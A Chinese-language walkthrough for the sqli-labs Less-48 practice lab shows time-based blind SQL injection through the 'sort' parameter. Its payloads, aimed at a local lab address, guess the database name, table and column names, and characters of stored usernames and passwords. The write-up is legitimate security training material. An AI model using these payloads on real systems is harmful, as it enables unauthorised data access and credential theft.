---
title: Less - 48
date: 2023-03-22T12:54:37Z
lastmod: 2023-03-22T13:13:20Z
---

# Less - 48

---

# 通关教程

---

## 1、判断闭合

---

```http
?sort=1--+
```

​![image](assets/image-20230322125650-20pftue.png)​

```http
?sort=1'--+
```

​![image](assets/image-20230322125731-hkpehan.png)​

---

## 2、查看当前数据库长度

---

```http
http://192.168.23.128/sqli-labs/Less-47/?sort=1 and if(length(database())=8,1,sleep(2))--+
```

​​![image](assets/image-20230322130746-09b4fxt.png)​

​页面快速反应，证明当前数据库长度为8

---

## 3、查看当前数据库的第一个字母

---

```http
http://192.168.23.128/sqli-labs/Less-48/?sort=1 and if(substr(database(),1,1)='s',1,sleep(2))--+
```

​![image](assets/image-20230322130719-39l7c7x.png)​

页面快速反应，证明当前库的第一个字母为s，更改substr函数的索引依次往后面猜解

---

## 4、查看当前库下的第一张表的第一个字母

---

```http
http://192.168.23.128/sqli-labs/Less-48/?sort=1 and if(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e',1,sleep(2))--+
```

​![image](assets/image-20230322131004-tigiw13.png)​

页面快速反应，证明当前库下的第一张表的第一个字母为e，更改substr函数的索引依次往后面猜解

---

## 5、查看users表下的第一个字段下的第一个字母

---

```http
http://192.168.23.128/sqli-labs/Less-48/?sort=1 and if(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)='u',1,sleep(2))--+
```

​![image](assets/image-20230322131201-4f5yyhe.png)​

页面快速反应，证明users表下的第一个字段的第一个字母为u，更改substr函数的索引依次往后面猜解

---

## 6、查看username,password字段下的第一个值的第一个字母

---

```http
http://192.168.23.128/sqli-labs/Less-48/?sort=1 and if(substr((select group_concat(username,password) from security.users limit 0,1),1,1)='d',1,sleep(2))--+
```

​![image](assets/image-20230322131307-i9w3dl8.png)​

‍
